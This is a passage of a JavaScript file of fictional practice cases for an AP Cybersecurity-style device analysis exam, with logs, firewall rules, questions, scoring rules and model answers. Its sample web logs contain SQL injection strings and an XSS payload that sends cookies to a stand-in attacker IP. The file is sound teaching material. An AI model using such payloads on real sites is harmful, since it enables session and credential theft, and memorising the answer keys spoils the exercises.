/* FRQ Funhouse — original practice cases modeled on the AP Cybersecurity
   "Device Security Analysis" free-response format (6 sources, Parts A–E, 14 points).
   All devices, people, and IPs are fictional (IPs use documentation ranges).

   To add a case: copy one object below, keep the same shape.
   Line ids: "S2-4" = Source 2, line 4 (for tables: row 4; for S1 that is rule 4).
*/
window.FRQ_CASES = [
{
  id: 'medvault',
  name: 'MEDVAULT-01',
  org: 'Riverside Family Clinic — patient records server',
  intro: 'The following sources all come from the same device and were collected during a risk assessment. The device\'s IP address is 10.20.0.15.',
  files: {
    'patients.csv': 'rw-rw-rw-', 'backup.sh': 'rwxr-x---', 'api.key': 'rw-------',
    'schedule.txt': 'rw-r--r--', 'export.sh': 'rwxrwxrwx'
  },
  sources: [
    { id: 'S1', title: 'Device firewall rules (evaluated top to bottom, first match wins)', type: 'table',
      head: ['Rule', 'Action', 'Source', 'Destination', 'Direction', 'Port', 'Protocol'],
      rows: [
        ['1', 'Allow', 'ALL', '10.20.0.15', 'Inbound', '443', 'HTTPS'],
        ['2', 'Allow', '10.20.0.0/24', '10.20.0.15', 'Inbound', '22', 'SSH'],
        ['3', 'Allow', 'ALL', '10.20.0.15', 'Inbound', '21', 'FTP'],
        ['4', 'Allow', 'ALL', '10.20.0.15', 'Inbound', '80', 'HTTP'],
        ['5', 'Allow', '10.20.0.40', '10.20.0.15', 'Inbound', '3306', 'MySQL'],
        ['6', 'Allow', 'ALL', '10.20.0.15', 'Inbound', '3389', 'RDP'],
        ['7', 'Deny', 'ALL', 'ALL', 'Inbound', 'ALL', 'ALL']
      ] },
    { id: 'S2', title: 'Authentication log', type: 'log', cmd: 'sudo tail -n 15 /var/log/auth.log',
      lines: [
        'Nov 18 07:58:02 medvault sshd[1102]: Accepted password for tlee from 10.20.0.22 port 51544 ssh2',
        'Nov 18 07:58:02 medvault sshd[1102]: pam_unix(sshd:session): session opened for user tlee',
        'Nov 18 08:00:01 medvault CRON[1140]: (root) CMD (/srv/records/backup.sh)',
        'Nov 18 08:14:30 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "admin"',
        'Nov 18 08:14:31 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "root"',
        'Nov 18 08:14:31 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "backup"',
        'Nov 18 08:14:32 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "clinic"',
        'Nov 18 08:14:32 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "tlee"',
        'Nov 18 08:14:33 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "nurse1"',
        'Nov 18 08:14:33 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "frontdesk"',
        'Nov 18 08:14:34 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "it"',
        'Nov 18 08:14:34 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "guest"',
        'Nov 18 08:14:35 medvault vsftpd[1201]: FAIL LOGIN: Client "198.51.100.77", user "test"',
        'Nov 18 08:20:12 medvault sshd[1250]: Accepted password for rkhan from 10.20.0.31 port 50210 ssh2',
        'Nov 18 08:31:40 medvault sudo: tlee : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/apt upgrade'
      ] },
    { id: 'S3', title: 'Firewall log', type: 'log', cmd: 'sudo tail -n 6 /var/log/ufw.log',
      lines: [
        'Nov 18 08:02:11 medvault kernel: [UFW ALLOW] IN=eth0 SRC=10.20.0.22 DST=10.20.0.15 PROTO=TCP DPT=443',
        'Nov 18 08:09:47 medvault kernel: [UFW ALLOW] IN=eth0 SRC=10.20.0.40 DST=10.20.0.15 PROTO=TCP DPT=3306',
        'Nov 18 08:14:29 medvault kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.77 DST=10.20.0.15 PROTO=TCP DPT=21',
        'Nov 18 08:16:05 medvault kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.77 DST=10.20.0.15 PROTO=TCP DPT=23',
        'Nov 18 08:22:50 medvault kernel: [UFW ALLOW] IN=eth0 SRC=192.0.2.66 DST=10.20.0.15 PROTO=TCP DPT=80',
        'Nov 18 08:40:13 medvault kernel: [UFW BLOCK] IN=eth0 SRC=10.20.0.31 DST=10.20.0.15 PROTO=TCP DPT=8443'
      ] },
    { id: 'S4', title: 'Web application log (patient portal)', type: 'log', cmd: 'sudo tail -n 7 /var/log/apache2/access.log',
      lines: [
        '192.0.2.10 - - [18/Nov 08:21:05] "GET /portal/login HTTP/1.1" 200 1840',
        '192.0.2.10 - - [18/Nov 08:21:19] "POST /portal/login HTTP/1.1" 302 0',
        '192.0.2.66 - - [18/Nov 08:22:51] "GET /portal/search?patient=smith HTTP/1.1" 200 2210',
        '192.0.2.66 - - [18/Nov 08:23:04] "GET /portal/search?patient=smith\' HTTP/1.1" 500 312',
        '192.0.2.66 - - [18/Nov 08:23:30] "GET /portal/search?patient=\' OR \'1\'=\'1\' -- HTTP/1.1" 200 88412',
        '192.0.2.66 - - [18/Nov 08:24:02] "GET /portal/search?patient=\' UNION SELECT username,password FROM users -- HTTP/1.1" 200 4120',
        '192.0.2.14 - - [18/Nov 08:25:47] "GET /portal/appointments HTTP/1.1" 200 3015'
      ] },
    { id: 'S5', title: 'File permissions', type: 'table', cmd: 'ls -l /srv/records',
      head: ['Permissions', 'Links', 'Owner', 'Group', 'Size', 'Modified', 'Name'],
      rows: [
        ['-rw-rw-rw-', '1', 'clinic', 'staff', '48210', 'Nov 17 16:02', 'patients.csv'],
        ['-rwxr-x---', '1', 'tlee', 'admins', '1204', 'Nov 10 09:15', 'backup.sh'],
        ['-rw-------', '1', 'tlee', 'tlee', '64', 'Nov 02 11:40', 'api.key'],
        ['-rw-r--r--', '1', 'clinic', 'staff', '3310', 'Nov 17 08:05', 'schedule.txt'],
        ['-rwxrwxrwx', '1', 'rkhan', 'staff', '902', 'Nov 14 13:22', 'export.sh']
      ] },
    { id: 'S6', title: 'Acceptable use policy for this device', type: 'log',
      lines: [
        'Passwords must be at least 8 characters long.',
        'Users must lock the screen when stepping away from the workstation.',
        'Operating system updates are installed manually by users when prompted.',
        'USB storage devices may not be connected to clinic devices.',
        'Remote connections to clinic systems must use the clinic VPN.',
        'Patient data may not be sent to personal email accounts.'
      ] }
  ],
  parts: [
    { id: 'A-i', group: 'A', label: 'A (i)', verb: 'Explain', pts: 1,
      text: 'Consider the policy in Source 6. Explain how one part of the policy helps protect the device.',
      rule: 'Names one policy item AND explains how it protects the device (the "because / so that" link).',
      model: 'Item 4 bans USB storage devices. This protects the device because a USB drive the clinic does not control could carry malware that installs itself when it is plugged in.',
      checks: [{ k: 'reason' }, { k: 'any', any: ['usb', 'lock', 'vpn', 'email', 'password', 'update', 'item', 'policy'], msg: 'Point to a specific policy item.' }],
      evidence: [['S6-1', 'S6-2', 'S6-3', 'S6-4', 'S6-5', 'S6-6']],
      tiles: {
        claim: ['Item 4 bans USB storage devices on clinic devices.', 'The policy keeps the device safe.', 'Long passwords are good.'],
        reason: ['This protects the device because an unknown USB drive could install malware when it is plugged in.', 'This is a rule that users have to follow.', 'Because USB drives are bad.'],
        correct: [0, 0]
      } },
    { id: 'A-ii', group: 'A', label: 'A (ii)', verb: 'Explain', pts: 1,
      text: 'Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example in your response.',
      rule: 'MODIFIES an existing item (not a brand-new rule) with a specific change and explains why it is more secure.',
      model: 'Item 3 could be changed so OS updates install automatically every week instead of manually. Patches would be applied without depending on users, so known vulnerabilities stay closed.',
      checks: [{ k: 'reason' }, { k: 'any', any: ['change', 'modif', 'instead', 'require', 'automatic', 'increase', 'at least'], msg: 'Say how the existing item changes.' }] },
    { id: 'B-i', group: 'B', label: 'B (i)', verb: 'Describe', pts: 1,
      text: 'Describe evidence of a password attack in the authentication log. Include specific entries from the log in your response.',
      rule: 'Points to the repeated failed logins from the same IP in quick succession, citing specific lines.',
      model: 'Lines 4–13 of Source 2 show ten FAIL LOGIN attempts to FTP from 198.51.100.77, each with a different username, all within five seconds (08:14:30–08:14:35).',
      checks: [{ k: 'cite' }, { k: 'any', any: ['fail', 'failed'], msg: 'Mention the failed login attempts.' }],
      evidence: [['S2-4', 'S2-5', 'S2-6', 'S2-7', 'S2-8', 'S2-9', 'S2-10', 'S2-11', 'S2-12', 'S2-13']], need: 3,
      tiles: {
        claim: ['A password attack (password spraying) was attempted against FTP.', 'There was a successful login.', 'The CRON job shows an attack.'],
        reason: ['Lines 4–13 show ten failed FTP logins from 198.51.100.77, each a different username, within about five seconds.', 'There is a lot of traffic in the log.', 'Line 14 shows a user logging in.'],
        correct: [0, 0]
      } },
    { id: 'B-ii', group: 'B', label: 'B (ii)', verb: 'Identify', pts: 1,
      text: 'Identify the IP address of the adversary in the password attack.',
      rule: 'Exactly one IP: 198.51.100.77. Listing more than one IP, or only part of the address, earns nothing.',
      model: '198.51.100.77',
      checks: [{ k: 'has', any: ['198.51.100.77'], msg: 'Give the full attacking IP address.' }, { k: 'not', any: ['10.20.0.22', '10.20.0.31', '192.0.2.66', '10.20.0.15'], msg: 'Only one IP: extra IPs cost the point.' }],
      evidence: [['S2-4', 'S2-5', 'S2-6', 'S2-7', 'S2-8', 'S2-9', 'S2-10', 'S2-11', 'S2-12', 'S2-13']], need: 1,
      tiles: {
        claim: ['198.51.100.77', '198.51.100.77 and 10.20.0.31', '100.77'],
        reason: ['It is the client in every FAIL LOGIN entry on lines 4–13.', 'It appears somewhere in the logs.', 'It is the device\'s own address.'],
        correct: [0, 0]
      } },
    { id: 'C-i', group: 'C', label: 'C (i)', verb: 'Explain', pts: 1,
      text: 'Explain how the permission settings for one file in /srv/records determine the level of access for the owner, the group, and all other users. Include the name of the file in your response.',
      rule: 'Names the file and correctly reads ALL THREE sets (owner, group, others), tying each to its permission bits.',
      model: 'For backup.sh (rwxr-x---), the owner tlee can read, write and execute (rwx); the admins group can read and execute (r-x); all other users have no access (---).',
      checks: [{ k: 'file' }, { k: 'any', any: ['owner'], msg: 'Cover the owner.' }, { k: 'any', any: ['group'], msg: 'Cover the group.' }, { k: 'any', any: ['other', 'everyone', 'world'], msg: 'Cover all other users.' }],
      evidence: [['S5-1', 'S5-2', 'S5-3', 'S5-4', 'S5-5']], need: 1, max: 1,
      tiles: {
        claim: ['For backup.sh (rwxr-x---):', 'For a file in the folder:', 'Everyone can read backup.sh.'],
        reason: ['the owner can read, write and execute (rwx), the admins group can read and execute (r-x), and others have no access (---).', 'the owner can read and write and the group can read.', 'it is open to all users.'],
        correct: [0, 0]
      } },
    { id: 'C-ii', group: 'C', label: 'C (ii)', verb: 'Describe', pts: 1,
      text: 'Other than removing all permissions from all users, describe one way the permission settings for one file could be configured to restrict access for some users. Include the name of the file in your response.',
      rule: 'Names a file and removes a permission it currently HAS from some users. Not "remove everything," not removing the owner\'s access.',
      model: 'Remove read and write permission for others on patients.csv so only the clinic owner and the staff group can open or change patient records.',
      checks: [{ k: 'file' }, { k: 'any', any: ['remove', 'take away', 'revoke', 'restrict', 'only'], msg: 'Describe what permission is removed.' }, { k: 'not', any: ['all permissions', 'everything', 'no one'], msg: 'The prompt rules out removing all permissions.' }] },
    { id: 'C-iii', group: 'C', label: 'C (iii)', verb: 'Write', pts: 1,
      text: 'Using your description in part C (ii), write one or more chmod commands that set the permissions you described.',
      rule: 'Valid chmod syntax (octal or symbolic) that produces exactly what you described in C (ii). Scored on its own: it can earn the point even if C (ii) did not.',
      model: 'chmod 660 patients.csv   (or: chmod o-rw patients.csv)',
      checks: [{ k: 'chmod' }] },
    { id: 'D-i', group: 'D', label: 'D (i)', verb: 'Explain', pts: 1,
      text: 'Explain how one connection attempt on the device was blocked by the device\'s firewall. Include evidence from a log file in your response.',
      rule: 'Cites a BLOCK line from the log AND the firewall rule that caused it, and explains why that rule applies.',
      model: 'Source 3 line 6 shows a blocked TCP connection from 10.20.0.31 to port 8443. No rule allows port 8443, so the traffic falls through to rule 7, which denies all other inbound traffic.',
      checks: [{ k: 'cite' }, { k: 'any', any: ['rule 7', 'deny', 'no rule', 'not allowed', 'not permitted'], msg: 'Name the firewall rule that blocked it.' }, { k: 'reason' }],
      evidence: [['S3-4', 'S3-6'], ['S1-7']], need: 1,
      tiles: {
        claim: ['The firewall blocked 10.20.0.31 from reaching port 8443.', 'User admin failed to log in because of a wrong password.', 'The firewall blocked SSH from 10.20.0.22.'],
        reason: ['Source 3 line 6 shows [UFW BLOCK] to DPT=8443. No rule allows port 8443, so it hits rule 7 (deny all inbound).', 'The firewall is turned on.', 'Line 4 of the auth log shows FAIL LOGIN.'],
        correct: [0, 0]
      } },
    { id: 'D-ii', group: 'D', label: 'D (ii)', verb: 'Describe', pts: 1,
      text: 'Other than allowing all traffic for all services, describe a modification to one firewall rule that would allow the connection attempt identified in part D (i).',
      rule: 'Changes ONE existing rule so the specific blocked connection is allowed. Not a new deny rule, not "disable the firewall," not "allow all."',
      model: 'Change rule 4 so its port is 8443 instead of 80, which would allow 10.20.0.31 to reach the device on port 8443.',
      checks: [{ k: 'any', any: ['rule'], msg: 'Name the rule you are modifying.' }, { k: 'not', any: ['disable', 'turn off', 'allow all traffic', 'all ports'], msg: 'The prompt rules out allowing everything.' }] },
    { id: 'D-iii', group: 'D', label: 'D (iii)', verb: 'Describe', pts: 1,
      text: 'Other than allowing the connection attempt identified in part D (i), describe one impact of your modification from part D (ii) on incoming or outgoing network traffic.',
      rule: 'A side effect of YOUR change on other traffic (e.g., the old port now blocked, or new exposure). Repeating "it allows the connection" earns nothing.',
      model: 'Because rule 4 no longer allows port 80, regular HTTP traffic to the portal would now fall to rule 7 and be blocked; only HTTPS on 443 would still work.',
      checks: [{ k: 'any', any: ['block', 'no longer', 'expose', 'stop', 'risk', 'would now', 'deny'], msg: 'Describe a side effect on other traffic.' }] },
    { id: 'E-i', group: 'E', label: 'E (i)', verb: 'Determine', pts: 1,
      text: 'Apart from the password attack identified in part B, there is evidence of another attack on the device. Determine the type of attack evidenced in a log file.',
      rule: 'Names ONE attack: SQL injection. Naming two attacks (where one is wrong) earns nothing.',
      model: 'SQL injection',
      checks: [{ k: 'has', any: ['sql injection', 'sqli', 'sql-injection'], msg: 'Name the attack type.' }, { k: 'not', any: ['xss', 'cross-site', 'cross site', 'ddos', 'traversal', 'buffer'], msg: 'One attack only: an extra wrong one costs the point.' }],
      evidence: [['S4-4', 'S4-5', 'S4-6']], need: 1,
      tiles: {
        claim: ['SQL injection', 'SQL injection and cross-site scripting', 'DDoS attack'],
        reason: ['The search field contains SQL syntax such as \' OR \'1\'=\'1\' -- and UNION SELECT.', 'There is a lot of web traffic.', 'One IP made several requests.'],
        correct: [0, 0]
      } },
    { id: 'E-ii', group: 'E', label: 'E (ii)', verb: 'Describe', pts: 1,
      text: 'Describe specific information in the log file that indicates the attack named in part E (i).',
      rule: 'Quotes or points to the specific malicious input in the log lines (the SQL syntax), not just "lots of traffic."',
      model: 'Source 4 lines 5–6: requests from 192.0.2.66 put \' OR \'1\'=\'1\' -- and UNION SELECT username,password FROM users into the patient search field. Line 5 returned 88,412 bytes, far more than a normal search (2,210 on line 3).',
      checks: [{ k: 'cite' }, { k: 'any', any: ["or '1'='1", "or 1=1", 'union', 'select', "'1'='1"], msg: 'Point to the actual SQL syntax in the request.' }],
      evidence: [['S4-5', 'S4-6', 'S4-4']], need: 1,
      tiles: {
        claim: ['Source 4 lines 5–6 contain SQL code in the search field.', 'The attacker sent a GET request, so they were hacking.', 'The website returned code 200.'],
        reason: ['\' OR \'1\'=\'1\' -- makes the WHERE clause always true, and UNION SELECT tries to pull usernames and passwords from the users table.', 'GET requests are dangerous.', '200 means the attack worked.'],
        correct: [0, 0]
      } },
    { id: 'E-iii', group: 'E', label: 'E (iii)', verb: 'Describe', pts: 1,
      text: 'Describe one way an automated system could halt this type of attack in real time.',
      rule: 'An automated control (IPS, WAF, etc.) that detects the attack pattern and takes action as it happens.',
      model: 'A web application firewall or IPS could detect SQL keywords like UNION SELECT or \' OR \'1\'=\'1 in requests and immediately drop the request and block 192.0.2.66.',
      checks: [{ k: 'any', any: ['ips', 'waf', 'firewall', 'automat', 'detect', 'block'], msg: 'Name the automated system and what it does.' }] },
    { id: 'E-iv', group: 'E', label: 'E (iv)', verb: 'Identify', pts: 1,
      text: 'This attack could be mitigated by an automated system such as a firewall, IDS, IPS, or AI. Identify a different countermeasure that could mitigate, prevent, or deter the attack.',
      rule: 'A countermeasure that is NOT one of the automated systems listed (e.g., input sanitization, parameterized queries).',
      model: 'Use parameterized queries (prepared statements) and sanitize user input in the search form.',
      checks: [{ k: 'any', any: ['sanitiz', 'parameter', 'prepared', 'validat', 'escape', 'least privilege'], msg: 'Name a countermeasure other than an automated system.' }, { k: 'not', any: ['ips', 'ids', 'firewall', ' ai'], msg: 'The prompt already listed those; name a different one.' }] }
  ]
},
{
  id: 'lakeshore',
  name: 'LAKESHORE-WEB',
  org: 'Lakeshore High School — public web server',
  intro: 'The following sources all come from the same device and were collected during a risk assessment. The device\'s IP address is 172.16.5.10.',
  files: {
    'grades_export.csv': 'rw-rw-r--', 'deploy.sh': 'rwxrwxrwx', 'db.conf': 'rw-------',
    'index.html': 'rw-r--r--', 'rotate_logs.sh': 'rwxr-x---'
  },
  sources: [
    { id: 'S1', title: 'Device firewall rules (evaluated top to bottom, first match wins)', type: 'table',
      head: ['Rule', 'Action', 'Source', 'Destination', 'Direction', 'Port', 'Protocol'],
      rows: [
        ['1', 'Allow', 'ALL', '172.16.5.10', 'Inbound', '443', 'HTTPS'],
        ['2', 'Allow', 'ALL', '172.16.5.10', 'Inbound', '80', 'HTTP'],
        ['3', 'Allow', 'ALL', '172.16.5.10', 'Inbound', '22', 'SSH'],
        ['4', 'Allow', '172.16.5.0/24', '172.16.5.10', 'Inbound', '445', 'SMB'],
        ['5', 'Allow', '172.16.5.25', '172.16.5.10', 'Inbound', '5432', 'PostgreSQL'],
        ['6', 'Allow', 'ALL', '172.16.5.10', 'Inbound', '25', 'SMTP'],
        ['7', 'Deny', 'ALL', 'ALL', 'Inbound', 'ALL', 'ALL']
      ] },
    { id: 'S2', title: 'Authentication log', type: 'log', cmd: 'sudo tail -n 14 /var/log/auth.log',
      lines: [
        'Nov 20 06:45:10 lakeshore sshd[884]: Accepted publickey for msantos from 172.16.5.21 port 60112 ssh2',
        'Nov 20 06:45:10 lakeshore sshd[884]: pam_unix(sshd:session): session opened for user msantos',
        'Nov 20 07:12:03 lakeshore sshd[930]: Failed password for invalid user admin from 203.0.113.50 port 40110 ssh2',
        'Nov 20 07:12:03 lakeshore sshd[931]: Failed password for invalid user oracle from 203.0.113.50 port 40112 ssh2',
        'Nov 20 07:12:04 lakeshore sshd[932]: Failed password for root from 203.0.113.50 port 40114 ssh2',
        'Nov 20 07:12:04 lakeshore sshd[933]: Failed password for invalid user teacher from 203.0.113.50 port 40116 ssh2',
        'Nov 20 07:12:05 lakeshore sshd[934]: Failed password for msantos from 203.0.113.50 port 40118 ssh2',
        'Nov 20 07:12:05 lakeshore sshd[935]: Failed password for invalid user student from 203.0.113.50 port 40120 ssh2',
        'Nov 20 07:12:06 lakeshore sshd[936]: Failed password for invalid user webmaster from 203.0.113.50 port 40122 ssh2',
        'Nov 20 07:12:07 lakeshore sshd[937]: Failed password for invalid user pi from 203.0.113.50 port 40124 ssh2',
        'Nov 20 07:12:08 lakeshore sshd[938]: Failed password for invalid user ubuntu from 203.0.113.50 port 40126 ssh2',
        'Nov 20 07:12:09 lakeshore sshd[939]: Disconnected from 203.0.113.50 port 40126 [preauth]',
        'Nov 20 07:30:00 lakeshore CRON[990]: (root) CMD (/var/www/lakeshore/rotate_logs.sh)',
        'Nov 20 07:41:22 lakeshore sudo: msantos : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx'
      ] },
    { id: 'S3', title: 'Firewall log', type: 'log', cmd: 'sudo tail -n 6 /var/log/ufw.log',
      lines: [
        'Nov 20 07:12:02 lakeshore kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.50 DST=172.16.5.10 PROTO=TCP DPT=22',
        'Nov 20 07:20:44 lakeshore kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.140 DST=172.16.5.10 PROTO=TCP DPT=3389',
        'Nov 20 07:25:31 lakeshore kernel: [UFW ALLOW] IN=eth0 SRC=172.16.5.25 DST=172.16.5.10 PROTO=TCP DPT=5432',
        'Nov 20 07:33:09 lakeshore kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.200 DST=172.16.5.10 PROTO=TCP DPT=443',
        'Nov 20 07:50:16 lakeshore kernel: [UFW BLOCK] IN=eth0 SRC=172.16.5.25 DST=172.16.5.10 PROTO=TCP DPT=8080',
        'Nov 20 07:58:40 lakeshore kernel: [UFW ALLOW] IN=eth0 SRC=172.16.5.33 DST=172.16.5.10 PROTO=TCP DPT=445'
      ] },
    { id: 'S4', title: 'Web application log (school news site)', type: 'log', cmd: 'sudo tail -n 7 /var/log/nginx/access.log',
      lines: [
        '172.16.5.60 - - [20/Nov 07:32:10] "GET /news/fall-musical HTTP/1.1" 200 5120',
        '198.51.100.200 - - [20/Nov 07:33:10] "GET /news/fall-musical HTTP/1.1" 200 5120',
        '198.51.100.200 - - [20/Nov 07:33:41] "GET /news/comment?msg=Great+show! HTTP/1.1" 200 640',
        '198.51.100.200 - - [20/Nov 07:34:02] "GET /news/comment?msg=<b>test</b> HTTP/1.1" 200 652',
        '198.51.100.200 - - [20/Nov 07:34:30] "GET /news/comment?msg=<script>alert(1)</script> HTTP/1.1" 200 667',
        '198.51.100.200 - - [20/Nov 07:35:12] "GET /news/comment?msg=<script>fetch(\'http://198.51.100.200/c?\'+document.cookie)</script> HTTP/1.1" 200 702',
        '172.16.5.61 - - [20/Nov 07:40:05] "GET /news/fall-musical HTTP/1.1" 200 5880'
      ] },
    { id: 'S5', title: 'File permissions', type: 'table', cmd: 'ls -l /var/www/lakeshore',
      head: ['Permissions', 'Links', 'Owner', 'Group', 'Size', 'Modified', 'Name'],
      rows: [
        ['-rw-rw-r--', '1', 'www-data', 'webteam', '20480', 'Nov 19 15:40', 'grades_export.csv'],
        ['-rwxrwxrwx', '1', 'msantos', 'webteam', '1530', 'Nov 12 10:02', 'deploy.sh'],
        ['-rw-------', '1', 'www-data', 'www-data', '210', 'Nov 01 09:00', 'db.conf'],
        ['-rw-r--r--', '1', 'www-data', 'webteam', '8840', 'Nov 19 16:11', 'index.html'],
        ['-rwxr-x---', '1', 'msantos', 'admins', '640', 'Nov 05 07:30', 'rotate_logs.sh']
      ] },
    { id: 'S6', title: 'Acceptable use policy for this device', type: 'log',
      lines: [
        'Staff accounts must use passwords of at least 10 characters.',
        'Multi-factor authentication is required for staff email.',
        'Server software is updated by the IT team once a month.',
        'Student data may only be stored on district-approved systems.',
        'Shared accounts are not permitted; each person uses their own login.',
        'Remote administration of the server is allowed from any network.'
      ] }
  ],
  parts: [
    { id: 'A-i', group: 'A', label: 'A (i)', verb: 'Explain', pts: 1,
      text: 'Consider the policy in Source 6. Explain how one part of the policy helps protect the device.',
      rule: 'Names one policy item AND explains how it protects the device.',
      model: 'Item 5 bans shared accounts. Because every person has their own login, actions in the logs can be traced to one person, and one leaked password does not give an attacker everyone\'s access.',
      checks: [{ k: 'reason' }, { k: 'any', any: ['shared', 'mfa', 'multi', 'password', 'update', 'student data', 'item', 'policy'], msg: 'Point to a specific policy item.' }],
      evidence: [['S6-1', 'S6-2', 'S6-3', 'S6-4', 'S6-5']],
      tiles: {
        claim: ['Item 5 says shared accounts are not permitted.', 'The policy has good rules.', 'Item 6 protects the server.'],
        reason: ['Because each person has their own login, actions can be traced to one person and one stolen password does not unlock everyone\'s access.', 'Sharing is bad.', 'This is what the IT team wants.'],
        correct: [0, 0]
      } },
    { id: 'A-ii', group: 'A', label: 'A (ii)', verb: 'Explain', pts: 1,
      text: 'Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example in your response.',
      rule: 'Modifies an existing item with a specific change and explains why it is more secure.',
      model: 'Item 6 could be changed so remote administration is only allowed through the district VPN. Admin logins would no longer be reachable from any network, which shrinks the attack surface for password attacks like the one in Source 2.',
      checks: [{ k: 'reason' }, { k: 'any', any: ['change', 'modif', 'instead', 'only', 'require', 'increase'], msg: 'Say how the existing item changes.' }] },
    { id: 'B-i', group: 'B', label: 'B (i)', verb: 'Describe', pts: 1,
      text: 'Describe evidence of a password attack in the authentication log. Include specific entries from the log in your response.',
      rule: 'Points to repeated failed logins from one IP in quick succession, citing specific lines.',
      model: 'Lines 3–11 of Source 2 show nine failed SSH password attempts from 203.0.113.50 for different usernames (admin, oracle, root, teacher...) within six seconds, from 07:12:03 to 07:12:08.',
      checks: [{ k: 'cite' }, { k: 'any', any: ['fail', 'failed'], msg: 'Mention the failed login attempts.' }],
      evidence: [['S2-3', 'S2-4', 'S2-5', 'S2-6', 'S2-7', 'S2-8', 'S2-9', 'S2-10', 'S2-11']], need: 3,
      tiles: {
        claim: ['A password attack was attempted against SSH.', 'msantos logged in, which is an attack.', 'The CRON job on line 13 is suspicious.'],
        reason: ['Lines 3–11 show nine failed SSH passwords from 203.0.113.50 for different usernames within six seconds.', 'There are a lot of lines in the log.', 'Line 1 shows an accepted public key.'],
        correct: [0, 0]
      } },
    { id: 'B-ii', group: 'B', label: 'B (ii)', verb: 'Identify', pts: 1,
      text: 'Identify the IP address of the adversary in the password attack.',
      rule: 'Exactly one IP: 203.0.113.50.',
      model: '203.0.113.50',
      checks: [{ k: 'has', any: ['203.0.113.50'], msg: 'Give the full attacking IP address.' }, { k: 'not', any: ['172.16.5.21', '198.51.100.200', '198.51.100.140', '172.16.5.10'], msg: 'Only one IP: extra IPs cost the point.' }],
      evidence: [['S2-3', 'S2-4', 'S2-5', 'S2-6', 'S2-7', 'S2-8', 'S2-9', 'S2-10', 'S2-11', 'S2-12']], need: 1,
      tiles: {
        claim: ['203.0.113.50', '203.0.113.50 and 198.51.100.200', 'port 40110'],
        reason: ['It is the source of every failed password on lines 3–11.', 'It is in the firewall log.', 'It is a port number.'],
        correct: [0, 0]
      } },
    { id: 'C-i', group: 'C', label: 'C (i)', verb: 'Explain', pts: 1,
      text: 'Explain how the permission settings for one file in /var/www/lakeshore determine the level of access for the owner, the group, and all other users. Include the name of the file in your response.',
      rule: 'Names the file and correctly reads all three sets.',
      model: 'For grades_export.csv (rw-rw-r--), the owner www-data can read and write, the webteam group can read and write, and all other users can read it (r--).',
      checks: [{ k: 'file' }, { k: 'any', any: ['owner'], msg: 'Cover the owner.' }, { k: 'any', any: ['group'], msg: 'Cover the group.' }, { k: 'any', any: ['other', 'everyone', 'world'], msg: 'Cover all other users.' }],
      evidence: [['S5-1', 'S5-2', 'S5-3', 'S5-4', 'S5-5']], need: 1, max: 1,
      tiles: {
        claim: ['For grades_export.csv (rw-rw-r--):', 'For the grades file:', 'grades_export.csv is open to all users.'],
        reason: ['the owner www-data can read and write (rw-), the webteam group can read and write (rw-), and all others can read (r--).', 'the owner can read and write and others can read.', 'anyone can do anything to it.'],
        correct: [0, 0]
      } },
    { id: 'C-ii', group: 'C', label: 'C (ii)', verb: 'Describe', pts: 1,
      text: 'Other than removing all permissions from all users, describe one way the permission settings for one file could be configured to restrict access for some users. Include the name of the file in your response.',
      rule: 'Names a file and removes a permission it currently has from some users.',
      model: 'Remove write and execute permission for the group and others on deploy.sh so only msantos can change or run the deployment script.',
      checks: [{ k: 'file' }, { k: 'any', any: ['remove', 'take away', 'revoke', 'restrict', 'only'], msg: 'Describe what permission is removed.' }, { k: 'not', any: ['all permissions', 'everything', 'no one'], msg: 'The prompt rules out removing all permissions.' }] },
    { id: 'C-iii', group: 'C', label: 'C (iii)', verb: 'Write', pts: 1,
      text: 'Using your description in part C (ii), write one or more chmod commands that set the permissions you described.',
      rule: 'Valid chmod syntax that produces exactly what you described in C (ii). Scored on its own.',
      model: 'chmod 744 deploy.sh   (or: chmod go-wx deploy.sh)',
      checks: [{ k: 'chmod' }] },
    { id: 'D-i', group: 'D', label: 'D (i)', verb: 'Explain', pts: 1,
      text: 'Explain how one connection attempt on the device was blocked by the device\'s firewall. Include evidence from a log file in your response.',
      rule: 'Cites a BLOCK line AND the rule responsible, and explains why it applies.',
      model: 'Source 3 line 5 shows 172.16.5.25 blocked on port 8080. No rule allows port 8080, so the traffic reaches rule 7, which denies all other inbound traffic.',
      checks: [{ k: 'cite' }, { k: 'any', any: ['rule 7', 'deny', 'no rule', 'not allowed', 'not permitted'], msg: 'Name the firewall rule that blocked it.' }, { k: 'reason' }],
      evidence: [['S3-2', 'S3-5'], ['S1-7']], need: 1,
      tiles: {
        claim: ['The firewall blocked 172.16.5.25 from reaching port 8080.', 'The firewall blocked the SSH password attack.', 'The firewall blocked 172.16.5.33 on SMB.'],
        reason: ['Source 3 line 5 shows [UFW BLOCK] DPT=8080. No rule allows 8080, so it falls to rule 7 (deny all inbound).', 'Line 3 of the auth log shows a failed password.', 'The firewall blocks hackers.'],
        correct: [0, 0]
      } },
    { id: 'D-ii', group: 'D', label: 'D (ii)', verb: 'Describe', pts: 1,
      text: 'Other than allowing all traffic for all services, describe a modification to one firewall rule that would allow the connection attempt identified in part D (i).',
      rule: 'Changes ONE existing rule so the specific blocked connection is allowed.',
      model: 'Change rule 5 so its port is 8080 instead of 5432, which would allow 172.16.5.25 to reach the device on port 8080.',
      checks: [{ k: 'any', any: ['rule'], msg: 'Name the rule you are modifying.' }, { k: 'not', any: ['disable', 'turn off', 'allow all traffic', 'all ports'], msg: 'The prompt rules out allowing everything.' }] },
